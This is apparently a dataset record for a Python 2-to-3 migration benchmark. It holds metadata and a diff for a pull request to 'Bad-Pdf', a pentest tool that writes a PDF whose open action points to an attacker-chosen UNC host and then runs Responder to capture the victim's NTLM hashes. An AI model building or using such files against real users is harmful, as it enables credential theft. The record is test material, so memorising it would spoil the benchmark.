@@ -1,0 +1,80 @@
+{
+  "instance_id": "py2_py3__deepzec__Bad-Pdf__pr21",
+  "scenario": "language_migration",
+  "subtype": "py2_py3",
+  "repo_full_name": "deepzec/Bad-Pdf",
+  "pr_number": 21,
+  "pr_url": "https://github.com/deepzec/Bad-Pdf/pull/21",
+  "repo": {
+    "full_name": "deepzec/Bad-Pdf",
+    "clone_url": "https://github.com/deepzec/Bad-Pdf.git",
+    "default_branch": "master",
+    "created_at": "2018-04-29T15:21:35Z",
+    "stars": 1139,
+    "license": "GPL-3.0",
+    "size_kb": 1537
+  },
+  "pull_request": {
+    "id": 2927996602,
+    "title": "Convert badpdf.py from Python 2 to Python 3",
+    "body": "Hi @deepzec , \r\n\r\nDuring a pentest I found your script to be successful but only after rewriting it to python3. Opening a PR so others don't have to do it. \r\n- Changed shebang to python3\r\n- Replaced raw_input() with input()\r\n- Converted print formatting to f-strings\r\n- Fixed ASCII art escape sequences with raw strings (r''')\r\n- Fixed bytes/string concatenation using f-string formatting\r\n- Encode PDF content to bytes only when writing to file",
+    "created_at": "2025-10-19T18:44:39Z",
+    "merged_at": "2025-10-20T04:08:48Z",
+    "base_sha": "a8149eea8bdc2b136a5c19d327ab3bf729e6c6b4",
+    "head_sha": "4ca7a9d2651192f3004b0bbe56ead277f7932b9b",
+    "merge_commit_sha": "4b42f6678e0ba1ea56cb2543df9e0d1d9457c845",
+    "labels": []
+  },
+  "matched_queries": [
+    "query_c"
+  ],
+  "base_sha": "a8149eea8bdc2b136a5c19d327ab3bf729e6c6b4",
+  "final_sha": "4ca7a9d2651192f3004b0bbe56ead277f7932b9b",
+  "changed_files": [
+    {
+      "sha": "61d789016559163292cc650c69b549c64429afa7",
+      "filename": "badpdf.py",
+      "status": "modified",
+      "additions": 16,
+      "deletions": 16,
+      "changes": 32,
+      "blob_url": "https://github.com/deepzec/Bad-Pdf/blob/4ca7a9d2651192f3004b0bbe56ead277f7932b9b/badpdf.py",
+      "raw_url": "https://github.com/deepzec/Bad-Pdf/raw/4ca7a9d2651192f3004b0bbe56ead277f7932b9b/badpdf.py",
+      "contents_url": "https://api.github.com/repos/deepzec/Bad-Pdf/contents/badpdf.py?ref=4ca7a9d2651192f3004b0bbe56ead277f7932b9b",
+      "patch": "@@ -1,10 +1,9 @@\n-#!/usr/bin/python\n+#!/usr/bin/env python3\n # -*- coding: utf-8 -*-\n-from __future__ import print_function\n import io\n import os\n import subprocess\n-\"\"\"\" \n+r\"\"\" \n ====================================================================================================================\n         ______                 __       _______  ______   ________  \n         |_   _ \\               |  ]     |_   __ \\|_   _ `.|_   __  | \n@@ -25,8 +24,7 @@\n \n def create_malpdf(filename, host):\n     print(\"[*] Starting Process.. [*]\")\n-    with io.FileIO(filename, \"w\") as file:\n-        file.write('''\n+    pdf_content = f'''\n %PDF-1.7\n \n 1 0 obj\n@@ -54,7 +52,7 @@ def create_malpdf(filename, host):\n \n    /AA <<\n \t   /O <<\n-\t      /F (''' + host + '''test)\n+\t      /F ({host}test)\n \t\t  /D [ 0 /Fit]\n \t\t  /S /GoToE\n \t\t  >>\n@@ -93,20 +91,22 @@ def create_malpdf(filename, host):\n >>\n \n %%EOF\n-''')\n+'''\n+    with io.FileIO(filename, \"w\") as file:\n+        file.write(pdf_content.encode())\n \n \n if __name__ == \"__main__\":\n \n     try:\n-        print(\"\"\"\n+        print(r\"\"\"\n       \n         ______                 __       _______  ______   ________  \n         |_   _ \\               |  ]     |_   __ \\|_   _ `.|_   __  | \n           | |_) |  ,--.    .--.| | ______ | |__) | | | `. \\ | |_ \\_| \n-          |  __'. `'_\\ : / /'`\\' ||______||  ___/  | |  | | |  _|    \n+          |  __'. `'_\\ : / /'`' ||______||  ___/  | |  | | |  _|    \n          _| |__) |// | |,| \\__/  |       _| |_    _| |_.' /_| |_     \n-        |_______/ \\'-;__/ '.__.;__]     |_____|  |______.'|_____|\n+        |_______/ '-;__/ '.__.;__]     |_____|  |______.'|_____|\n \n         Author : Deepu TV ; Alias DeepZec \n \n@@ -115,18 +115,18 @@ def create_malpdf(filename, host):\n \n \n         if os.path.isfile(responder):\n-            print(\"Responder detected :%s\" %responder )\n+            print(f\"Responder detected: {responder}\")\n \n         else:\n             print(\"Responder not found..\")\n-            responder = raw_input(\"Please enter responder path (Default /usr/sbin/responder): \\n\")\n+            responder = input(\"Please enter responder path (Default /usr/sbin/responder): \\n\")\n \n-        host = raw_input(\"Please enter Bad-PDF host IP: \\n\")\n-        filename = raw_input(\"Please enter output file name: \\n\")\n-        interface = raw_input(\"Please enter the interface name to listen(Default eth0): \\n\")\n+        host = input(\"Please enter Bad-PDF host IP: \\n\")\n+        filename = input(\"Please enter output file name: \\n\")\n+        interface = input(\"Please enter the interface name to listen(Default eth0): \\n\")\n         create_malpdf(filename, '\\\\\\\\' + '\\\\\\\\' + host + '\\\\\\\\')\n \n-        print(\"Bad PDF %s created\" %filename)\n+        print(f\"Bad PDF {filename} created\")\n \n         subprocess.Popen(responder + ' -I ' + interface + ' -wF', shell=True).wait()\n "
+    }
+  ],
+  "commit_summaries": [
+    {
+      "sha": "4ca7a9d2651192f3004b0bbe56ead277f7932b9b",
+      "message": "Convert badpdf.py from Python 2 to Python 3\n\n- Changed shebang to python3\n- Replaced raw_input() with input()\n- Converted print formatting to f-strings\n- Fixed ASCII art escape sequences with raw strings (r''')\n- Fixed bytes/string concatenation using f-string formatting\n- Encode PDF content to bytes only when writing to file",
+      "parent_shas": [
+        "a8149eea8bdc2b136a5c19d327ab3bf729e6c6b4"
+      ]
+    }
+  ],
+  "auto_filter": {
+    "status": "excluded",
+    "exclude_reasons": [
+      "no_tests_detected"
+    ],
+    "auto_signals": [
+      "keyword_match",
+      "strict_migration_signal",
+      "touches_code"
+    ],
+    "has_tests_before": false,
+    "adds_new_tests": false,
+    "touches_tests": false,
+    "touches_code": true,
+    "touches_source_language": true,
+    "touches_target_language": true,
+    "cross_language_mapping_visible": false,
+    "snapshot_error": ""
+  },
+  "paths": {
+    "metadata_path": "data\\raw\\pr_metadata\\py2_py3\\py2_py3__deepzec__Bad-Pdf__pr21.json",
+    "r0_path": "data\\raw\\repo_snapshots\\py2_py3\\deepzec__Bad-Pdf__pr21__py2_py3__deepzec__Bad-Pdf__pr21\\r0",
+    "rn_path": "data\\raw\\repo_snapshots\\py2_py3\\deepzec__Bad-Pdf__pr21__py2_py3__deepzec__Bad-Pdf__pr21\\rn"
+  }
+}
